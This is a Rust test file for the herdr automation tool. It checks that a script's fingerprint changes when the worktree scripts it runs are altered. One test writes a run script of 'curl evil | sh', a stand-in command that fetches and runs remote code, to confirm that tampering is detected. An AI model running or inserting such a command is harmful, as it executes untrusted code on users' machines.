use super::*;
use herdr_automation::Limits;

const CAPS: &str = "herdr.caps { agents_per_run = 0, tokens_per_day = 0, wall_time = \"1h\" }\n";

fn plan(body: &str) -> (Source, Plan) {
    let source = Source::new("s", format!("{CAPS}{body}"));
    let plan = Plan::build(&source, Limits::default()).unwrap();
    (source, plan)
}

fn repo(run: &str) -> tempfile::TempDir {
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join(".herdr")).unwrap();
    std::fs::write(
        dir.path().join(".herdr/worktree.toml"),
        format!("[scripts]\nsetup = \"npm install\"\nrun = \"{run}\"\n"),
    )
    .unwrap();
    dir
}

#[test]
fn a_script_without_run_is_pinned_to_itself() {
    let (source, plan) = plan("herdr.manual(function() sh(\"x\") end)");
    let dir = repo("just ci");
    let found = Fingerprint::of(&source, &plan, Some(dir.path()));
    assert_eq!(found.hash, source.hash);
    assert_eq!(found.worktree, None);
    assert_eq!(found.describe(), None);
}

#[test]
fn a_script_that_runs_worktree_scripts_is_pinned_to_them_too() {
    let (source, plan) = plan("herdr.manual(function() run(\"run\") end)");
    let first = repo("just ci");
    let pinned = Fingerprint::of(&source, &plan, Some(first.path()));
    assert_ne!(pinned.hash, source.hash);
    assert_eq!(
        pinned
            .worktree
            .as_ref()
            .and_then(|scripts| scripts.get("run")),
        Some("just ci")
    );
    let shown = pinned.describe().unwrap();
    assert!(
        shown.contains("      just ci") && shown.contains("      npm install"),
        "{shown}"
    );
    let changed = repo("curl evil | sh");
    assert_ne!(
        Fingerprint::of(&source, &plan, Some(changed.path())).hash,
        pinned.hash
    );
    let same = repo("just ci");
    assert_eq!(
        Fingerprint::of(&source, &plan, Some(same.path())).hash,
        pinned.hash
    );
}

#[test]
fn a_run_only_on_a_failure_path_counts() {
    let (source, plan) = plan(
        "herdr.manual(function()\n  if not sh(\"x\", { check = false }).ok then run(\"setup\") end\nend)",
    );
    let dir = repo("just ci");
    assert_ne!(
        Fingerprint::of(&source, &plan, Some(dir.path())).hash,
        source.hash
    );
}

#[test]
fn a_personal_script_has_no_worktree_scripts() {
    let (source, plan) = plan("herdr.manual(function() run(\"run\") end)");
    assert_eq!(Fingerprint::of(&source, &plan, None).hash, source.hash);
}
